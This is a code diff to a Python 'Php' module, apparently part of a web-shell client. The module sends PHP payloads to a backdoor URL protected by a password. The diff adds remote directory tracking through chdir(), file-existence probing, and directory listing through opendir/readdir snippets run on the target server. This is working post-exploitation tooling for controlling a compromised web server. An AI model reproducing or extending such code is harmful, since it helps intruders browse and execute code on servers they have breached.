@@ -16,7 +16,11 @@ class Php(Module):
     '''
     
     def __init__(self, modhandler, url, password):
+        
+        self.cwd_vector = None
         Module.__init__(self, modhandler, url, password)
+        
+        
 
     def _probe(self):
         
@@ -27,6 +31,9 @@ class Php(Module):
         
     
     def run(self, cmd):
+
+        if self.cwd_vector:
+            cmd = self.cwd_vector % (cmd)
 
         request = CmdRequest( self.url, self.password )
         request.setPayload(cmd)
@@ -41,6 +48,28 @@ class Php(Module):
             return resp
         
 
+    def cwd_handler (self, path, set_new_cwd=False):
+        
+        response = self.run("file_exists('%s') && print(1);" % path)
+        if response == '1':
+            if set_new_cwd:
+                self.cwd_vector = "chdir('%s') && %s" % ( path, '%s' )  
+                
+            return True
+        
+        return False
     
+    def ls_handler (self, cmd):
+        
+        cmd_splitted = cmd.split()
+        if cmd_splitted[0] == 'ls':
+            if len(cmd_splitted)==1:
+                path = '.'
+            if len(cmd_splitted)==2:
+                path = cmd_splitted[1]
+        
+        ls_vector = "$dir=@opendir('%s'); $a=array(); while(($f = readdir($dir))) { $a[]=$f; }; sort($a); print(join('\n', $a));"
+        
+        return self.run( ls_vector % (path))
     
     
